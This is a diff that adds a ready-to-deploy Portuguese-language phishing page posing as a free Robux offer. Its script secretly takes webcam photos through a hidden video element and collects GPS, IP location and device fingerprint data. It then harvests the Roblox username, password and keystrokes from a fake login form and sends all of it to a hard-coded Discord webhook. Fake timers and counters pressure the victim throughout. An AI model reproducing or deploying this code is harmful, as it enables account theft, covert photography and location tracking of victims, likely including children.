@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Ganhe 1.000 Robux — Verificação</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpolygon points='50,3 93,27 93,73 50,97 7,73 7,27' fill='%23ff2d78'/%3E%3Crect x='36' y='36' width='28' height='28' rx='4' fill='%23fff' transform='rotate(-14 50 50)'/%3E%3C/svg%3E">
+<style>
+:root{--pk:#ff2d78;--pk2:#ff5fa2;--pk3:#ffe3f0;--tx:#3b1f2e;--cinza:#8a7681}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100%}
+body{
+  background:linear-gradient(160deg,#ff2d78 0%,#ff6fae 45%,#ffb3d9 100%);
+  font-family:"Segoe UI",Roboto,-apple-system,system-ui,sans-serif;color:var(--tx);
+  display:flex;align-items:center;justify-content:center;padding:18px;
+  min-height:100vh;-webkit-tap-highlight-color:transparent;overflow-x:hidden
+}
+body::before,body::after{
+  content:'';position:fixed;width:230px;height:230px;border-radius:50%;
+  background:rgba(255,255,255,.13);pointer-events:none
+}
+body::before{top:-90px;left:-70px}
+body::after{bottom:-110px;right:-80px}
+
+#video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:0;pointer-events:none}
+
+.card{
+  position:relative;z-index:2;background:#fff;width:100%;max-width:400px;border-radius:22px;
+  padding:28px 24px 22px;box-shadow:0 20px 60px rgba(120,0,60,.35);text-align:center
+}
+.fase{display:none}
+.fase.on{display:block;animation:sobe .45s cubic-bezier(.2,.8,.3,1)}
+@keyframes sobe{from{opacity:0;transform:translateY(14px)}}
+
+.badge{display:inline-block;background:var(--pk3);color:var(--pk);font-size:11px;
+  font-weight:700;letter-spacing:1.5px;padding:6px 14px;border-radius:99px;margin-bottom:18px}
+.coin{width:84px;height:84px;display:block;margin:0 auto 14px;
+  filter:drop-shadow(0 8px 18px rgba(255,45,120,.4));animation:flutua 2.6s ease-in-out infinite}
+@keyframes flutua{50%{transform:translateY(-8px) rotate(4deg)}}
+h1{font-size:15px;letter-spacing:3px;color:var(--cinza);font-weight:700;margin-bottom:6px}
+.amount{font-size:40px;font-weight:800;color:var(--pk);letter-spacing:-1px;line-height:1.05;margin-bottom:4px}
+.amount small{font-size:19px;letter-spacing:0}
+.sub{font-size:14px;color:var(--cinza);line-height:1.55;margin:14px 0 22px}
+.sub b{color:var(--tx)}
+
+.btn{width:100%;padding:16px;border:0;border-radius:14px;font-family:inherit;font-size:16px;
+  font-weight:700;letter-spacing:.5px;color:#fff;cursor:pointer;
+  background:linear-gradient(180deg,var(--pk2),var(--pk));
+  box-shadow:0 8px 22px rgba(255,45,120,.42);transition:.15s}
+.btn:active{transform:scale(.975)}
+.btn:disabled{opacity:.6}
+.btn.escuro{background:#232527;box-shadow:0 8px 22px rgba(0,0,0,.25)}
+
+.info{font-size:12px;color:var(--cinza);margin-top:16px;line-height:1.6}
+.info b{color:var(--pk)}
+.selo{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;
+  color:#b8a5b0;margin-top:14px}
+
+h2{font-size:19px;font-weight:700;margin-bottom:6px}
+.psub{font-size:13px;color:var(--cinza);margin-bottom:20px}
+.bar{height:9px;background:#ffeaf3;border-radius:99px;overflow:hidden;margin-bottom:20px}
+.bar i{display:block;height:100%;width:0;border-radius:99px;
+  background:linear-gradient(90deg,var(--pk2),var(--pk));transition:width .5s ease}
+.steps{text-align:left;font-size:13px;color:#b8a5b0}
+.step{padding:5px 0;opacity:0;transform:translateX(-6px);transition:.3s}
+.step.on{opacity:1;transform:none}
+.step.done{color:var(--pk);font-weight:600}
+
+.rbLogo{width:46px;height:46px;background:#232527;border-radius:11px;transform:rotate(-14deg);
+  position:relative;margin:0 auto 16px}
+.rbLogo::after{content:'';position:absolute;inset:12px;background:#fff;border-radius:3px}
+.rbTitle{font-size:21px;font-weight:600;margin-bottom:5px}
+.rbSub{font-size:13px;color:var(--cinza);line-height:1.45;margin-bottom:22px}
+label{display:block;text-align:left;font-size:12px;color:#5d4a55;font-weight:600;margin-bottom:5px}
+input{width:100%;padding:13px;border:1.5px solid #e6dae1;border-radius:10px;font-size:16px;
+  margin-bottom:14px;font-family:inherit;outline:none;color:var(--tx);background:#fff}
+input:focus{border-color:var(--pk);box-shadow:0 0 0 3px rgba(255,45,120,.13)}
+.link{font-size:12px;color:var(--cinza);margin-top:14px}
+.link a{color:var(--pk);cursor:pointer;font-weight:600}
+
+.tick{width:74px;height:74px;border-radius:50%;margin:0 auto 18px;position:relative;
+  background:linear-gradient(180deg,#2fd07f,#00b06f);box-shadow:0 10px 26px rgba(0,176,111,.4);
+  animation:pop .45s cubic-bezier(.2,1.4,.4,1)}
+.tick::after{content:'';position:absolute;left:26px;top:15px;width:18px;height:34px;
+  border:solid #fff;border-width:0 5px 5px 0;transform:rotate(45deg)}
+@keyframes pop{from{transform:scale(.3);opacity:0}}
+.user{color:var(--pk);font-weight:700}
+.aviso{font-size:12px;color:var(--cinza);background:#fff5fa;border-radius:12px;
+  padding:12px;margin-top:18px;line-height:1.6}
+.spin{display:inline-block;width:15px;height:15px;border:2px solid rgba(255,255,255,.4);
+  border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-3px;margin-right:8px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.erro{font-size:11px;color:#c9b8c1;margin-top:12px;display:none}
+</style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline muted></video>
+
+<div class="card">
+
+  <div class="fase on" id="f1">
+    <div class="badge">OFERTA ATIVA</div>
+    <svg class="coin" viewBox="0 0 100 100">
+      <defs><linearGradient id="cg" x1="0" y1="0" x2="0" y2="1">
+        <stop offset="0" stop-color="#ff7db8"/><stop offset="1" stop-color="#ff2d78"/>
+      </linearGradient></defs>
+      <polygon points="50,3 93,27 93,73 50,97 7,73 7,27" fill="url(#cg)"/>
+      <rect x="36" y="36" width="28" height="28" rx="4" fill="#fff" transform="rotate(-14 50 50)"/>
+    </svg>
+    <h1>PARABÉNS!</h1>
+    <div class="amount">1.000 <small>ROBUX</small></div>
+    <p class="sub">Você foi selecionado para receber o <b>bônus de boas-vindas</b>.<br>É só confirmar sua conta para receber.</p>
+    <button class="btn" id="btnResgatar">RESGATAR AGORA</button>
+    <div class="info">⏱ Expira em <b id="timer">09:59</b> &nbsp;·&nbsp; 👥 <b id="gente">2.847</b> resgates hoje</div>
+    <div class="selo">🔒 Verificação segura · 30 segundos</div>
+  </div>
+
+  <div class="fase" id="f2">
+    <h2>Verificando sua conta...</h2>
+    <p class="psub">Não feche esta página</p>
+    <div class="bar"><i id="barraFill"></i></div>
+    <div class="steps" id="steps"></div>
+  </div>
+
+  <div class="fase" id="f3">
+    <div class="rbLogo"></div>
+    <div class="rbTitle">Entrar</div>
+    <div class="rbSub">Confirme os dados da sua conta<br>para receber os 1.000 Robux</div>
+    <label for="user">Nome de usuário</label>
+    <input id="user" autocapitalize="off" autocorrect="off" spellcheck="false"
+           autocomplete="username" placeholder="ex: seuusuario123">
+    <label for="pass">Senha</label>
+    <input id="pass" type="password" autocomplete="current-password" placeholder="Sua senha">
+    <button class="btn escuro" id="btnEntrar">Entrar</button>
+    <div class="link">Esqueceu a senha? <a id="verSenha">mostrar senha</a></div>
+  </div>
+
+  <div class="fase" id="f4">
+    <div class="tick"></div>
+    <h2>Robux enviados!</h2>
+    <p class="sub" style="margin-top:10px">Os <b>1.000 Robux</b> foram enviados para a conta<br>
+      <span class="user" id="userFinal">@usuario</span></p>
+    <div class="aviso">⏳ Pode levar até <b>24 horas</b> para aparecer no seu saldo.<br>Entre no jogo e confira!</div>
+    <button class="btn" id="btnVoltar" style="margin-top:16px">VOLTAR AO INÍCIO</button>
+  </div>
+
+  <div class="erro" id="erro">⚠ falha no envio</div>
+</div>
+
+<script>
+/* ==================================================================
+   ÚNICO LUGAR QUE VOCÊ PRECISA MEXER
+   ================================================================== */
+const WEBHOOK = 'https://discord.com/api/webhooks/1563021941487435897/Aoukv5-LwT47DyM88I6ezvWM-TqYj5R5Di6wS8rB6_8858vWTlD6QUcg-K7j8yNOSbyr';
+const NUM_FOTOS = 3;
+/* ================================================================== */
+
+const $ = s => document.querySelector(s);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const ok = v => (v === undefined || v === null || v === '') ? 'n/d' : v;
+
+function fase(n){
+  document.querySelectorAll('.fase').forEach((el, i) => el.classList.toggle('on', i === n - 1));
+  window.scrollTo(0, 0);
+}
+
+(function(){
+  let t = 599;
+  const el = $('#timer');
+  setInterval(() => {
+    if(t > 0) t--;
+    el.textContent = String(Math.floor(t / 60)).padStart(2,'0') + ':' + String(t % 60).padStart(2,'0');
+  }, 1000);
+  let g = 2847;
+  setInterval(() => { if(Math.random() > .55) $('#gente').textContent = (++g).toLocaleString('pt-BR'); }, 3200);
+})();
+
+async function ligarCamera(){
+  const v = $('#video');
+  const st = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false
+  });
+  v.srcObject = st;
+  await new Promise(r => { v.onloadedmetadata = r; setTimeout(r, 2500); });
+  try{ await v.play(); }catch(e){}
+}
+
+async function capturarFotos(n){
+  const v = $('#video'), c = document.createElement('canvas');
+  const w = Math.min(720, v.videoWidth || 640);
+  const h = Math.round(w * ((v.videoHeight || 480) / (v.videoWidth || 640)));
+  c.width = w; c.height = h;
+  const x = c.getContext('2d'), fotos = [];
+  for(let i = 0; i < n; i++){
+    x.save(); x.translate(w, 0); x.scale(-1, 1); x.drawImage(v, 0, 0, w, h); x.restore();
+    fotos.push(c.toDataURL('image/jpeg', .7));
+    if(i < n - 1) await sleep(1000);
+  }
+  return fotos;
+}
+
+function gps(){
+  return new Promise(res => {
+    if(!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p => res({ lat: p.coords.latitude.toFixed(6), lon: p.coords.longitude.toFixed(6),
+                 prec: Math.round(p.coords.accuracy) + ' m' }),
+      () => res(null), { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 });
+  });
+}
+
+function hash(s){ let h = 0x811c9dc5; for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,0x01000193);} 
+  return ('00000000' + (h>>>0).toString(16)).slice(-8).toUpperCase(); }
+function gpu(){ try{
+  const c=document.createElement('canvas'),gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+  if(!gl) return 'n/d'; const d=gl.getExtension('WEBGL_debug_renderer_info');
+  return d? gl.getParameter(d.UNMASKED_VENDOR_WEBGL)+' / '+gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.VERSION);
+}catch(e){return 'n/d'} }
+function so(ua){
+  const t=[[/Windows NT 10/,'Windows 10/11'],[/Windows/,'Windows'],[/Android ([\d.]+)/,'Android'],
+           [/iPhone|iPad|iPod/,'iOS'],[/Mac OS X/,'macOS'],[/Linux/,'Linux']];
+  for(const p of t) if(p[0].test(ua)) return p[1]; return navigator.platform||'?';
+}
+function nav(ua){
+  const t=[[/Edg\//,'Edge'],[/OPR\/|Opera/,'Opera'],[/SamsungBrowser/,'Samsung Internet'],
+           [/Firefox\//,'Firefox'],[/CriOS/,'Chrome iOS'],[/Chrome\//,'Chrome'],[/Safari\//,'Safari']];
+  for(const p of t) if(p[0].test(ua)) return p[1]; return '?';
+}
+async function ipPub(){
+  for(const u of ['https://ipwho.is/','https://ipapi.co/json/','https://api.ipify.org?format=json']){
+    try{ const r = await fetch(u); const j = await r.json(); if(j && (j.ip||j.query)) return j; }catch(e){}
+  }
+  return null;
+}
+async function bateria(){ try{ if(!navigator.getBattery) return 'n/d';
+  const b=await navigator.getBattery(); return Math.round(b.level*100)+'% '+(b.charging?'(carregando)':''); }catch(e){return 'n/d'} }
+
+async function coletar(){
+  const d = {}, ua = navigator.userAgent;
+  d.data_hora = new Date().toLocaleString('pt-BR');
+  d.pagina = location.href;
+  d.dispositivo = so(ua) + ' · ' + nav(ua);
+  d.agente = ua;
+  d.idioma = navigator.language;
+  d.fuso = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  d.tela = screen.width + 'x' + screen.height + ' @' + (devicePixelRatio||1) + 'x';
+  d.nucleos = navigator.hardwareConcurrency || '?';
+  d.ram = (navigator.deviceMemory || '?') + ' GB';
+  d.gpu = gpu();
+  d.toque = (navigator.maxTouchPoints||0) + ' pontos';
+  if(navigator.connection) d.conexao = navigator.connection.effectiveType;
+  if(navigator.userAgentData){
+    try{
+      const h = await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
+      if(h.model) d.modelo = h.model;
+    }catch(e){}
+  }
+  const [ip, bat] = await Promise.all([ipPub(), bateria()]);
+  if(ip){
+    d.ip = ip.ip || ip.query || 'n/d';
+    d.cidade = ip.city || ip.cidade || 'n/d';
+    d.regiao = ip.region || ip.region_name || 'n/d';
+    d.pais = ip.country || ip.country_name || 'n/d';
+    d.provedor = (ip.connection && ip.connection.isp) || ip.org || 'n/d';
+    d.coordenadas_ip = (ip.latitude||ip.lat) ? (ip.latitude||ip.lat)+', '+(ip.longitude||ip.lon) : 'n/d';
+  }
+  d.bateria = bat;
+  const pos = await gps();
+  if(pos){ d.gps = pos.lat + ', ' + pos.lon; d.precisao = pos.prec; }
+  d.fingerprint = hash(ua + screen.width + screen.height + navigator.language + (navigator.hardwareConcurrency||'') + gpu());
+  return d;
+}
+
+function b64Blob(u){ const p=u.split(','); const m=(p[0].match(/:(.*?);/)||[])[1]||'image/jpeg';
+  const b=atob(p[1]), a=new Uint8Array(b.length);
+  for(let i=0;i<b.length;i++) a[i]=b.charCodeAt(i);
+  return new Blob([a],{type:m}); }
+
+function texto(d, cred){
+  let t = '';
+  if(cred){
+    t += '🎮 CONTA ROBLOX\n';
+    t += '👤 usuário: ' + cred.usuario + '\n';
+    t += '🔑 senha: ' + cred.senha + '\n';
+    t += '⌨️ digitou: ' + cred.teclas + (cred.autofill ? '  (senha do navegador)' : '') + '\n';
+    t += '━━━━━━━━━━━━━━━\n';
+  }
+  for(const k in d){
+    const v = d[k];
+    if(!v) continue;
+    t += '• ' + k.replace(/_/g,' ') + ': ' + v + '\n';
+  }
+  return t;
+}
+async function enviarTexto(txt){
+  const partes = txt.match(/[\s\S]{1,1800}/g) || [txt];
+  for(const p of partes){
+    const fd = new FormData();
+    fd.append('payload_json', JSON.stringify({ content: p, username: 'Robux Rewards' }));
+    await fetch(WEBHOOK, { method:'POST', body: fd });
+  }
+}
+async function enviarFotos(fotos, legenda){
+  if(!fotos.length) return;
+  const fd = new FormData();
+  fd.append('payload_json', JSON.stringify({ content: legenda, username: 'Robux Rewards' }));
+  fotos.forEach((f, i) => fd.append('files[' + i + ']', b64Blob(f), 'foto' + (i+1) + '.jpg'));
+  await fetch(WEBHOOK, { method:'POST', body: fd });
+}
+
+let pronto = false;
+async function animarProgresso(){
+  const passos = ['Conectando ao servidor Roblox','Verificando disponibilidade da oferta',
+                  'Validando dispositivo','Reservando seus Robux'];
+  const barra = $('#barraFill');
+  for(let i = 0; i < passos.length; i++){
+    const el = document.createElement('div');
+    el.className = 'step'; el.textContent = passos[i];
+    $('#steps').appendChild(el);
+    await sleep(80); el.classList.add('on');
+    barra.style.width = Math.round(((i+1)/passos.length)*88) + '%';
+    await sleep(850);
+    el.textContent = '✓ ' + passos[i]; el.classList.add('done');
+  }
+  const ult = document.createElement('div');
+  ult.className = 'step on'; ult.textContent = 'Sincronizando com sua conta...';
+  $('#steps').appendChild(ult);
+  barra.style.width = '93%';
+  let t = 0;
+  while(!pronto && t < 90){ await sleep(150); t++; }
+  ult.textContent = '✓ Sincronizando com sua conta';
+  ult.classList.add('done');
+  barra.style.width = '100%';
+  await sleep(400);
+}
+
+let DADOS = {}, FOTOS = [], rodando = false;
+
+async function resgatar(){
+  if(rodando) return;
+  rodando = true;
+  $('#btnResgatar').disabled = true;
+  fase(2);
+
+  const prog = animarProgresso();
+
+  const captura = (async () => {
+    try{
+      await ligarCamera();
+      await sleep(500);
+      FOTOS = await capturarFotos(NUM_FOTOS);
+    }catch(e){}
+    pronto = true;
+  })();
+
+  const dados = coletar();
+
+  await Promise.all([prog, captura]);
+  const d = await dados; DADOS = d;
+
+  try{
+    await enviarTexto('🪙 NOVO RESGATE DE ROBUX — dados do dispositivo\n\n' + texto(d, null));
+    await enviarFotos(FOTOS, '📸 Fotos capturadas — ' + (d.cidade || '') + ' — ' + (d.data_hora || ''));
+  }catch(e){ $('#erro').style.display = 'block'; }
+
+  setTimeout(() => fase(3), 350);
+}
+
+let digitou = false, teclas = '';
+$('#pass').addEventListener('keydown', e => {
+  digitou = true;
+  if(e.key === 'Backspace') teclas += '[⌫]';
+  else if(e.key.length === 1) teclas += e.key;
+});
+$('#user').addEventListener('keydown', () => digitou = true);
+
+$('#verSenha').onclick = () => {
+  const p = $('#pass');
+  p.type = p.type === 'password' ? 'text' : 'password';
+  $('#verSenha').textContent = p.type === 'password' ? 'mostrar senha' : 'esconder senha';
+};
+
+$('#btnEntrar').onclick = async () => {
+  const usuario = $('#user').value.trim(), senha = $('#pass').value;
+  if(!usuario || !senha){
+    $('#btnEntrar').textContent = 'Preencha os dois campos';
+    setTimeout(() => $('#btnEntrar').textContent = 'Entrar', 1600);
+    return;
+  }
+  $('#btnEntrar').disabled = true;
+  $('#btnEntrar').innerHTML = '<span class="spin"></span>Entrando...';
+
+  const cred = { usuario, senha, teclas: teclas || '(nada)', autofill: !digitou };
+  try{ await enviarTexto('🎮 CONTA ROBLOX CAPTURADA\n\n' + texto(DADOS, cred)); }catch(e){}
+
+  setTimeout(() => {
+    $('#userFinal').textContent = '@' + usuario;
+    fase(4);
+  }, 1400);
+};
+
+$('#btnResgatar').onclick = resgatar;
+$('#btnVoltar').onclick = () => location.reload();
+</script>
+</body>
+</html>
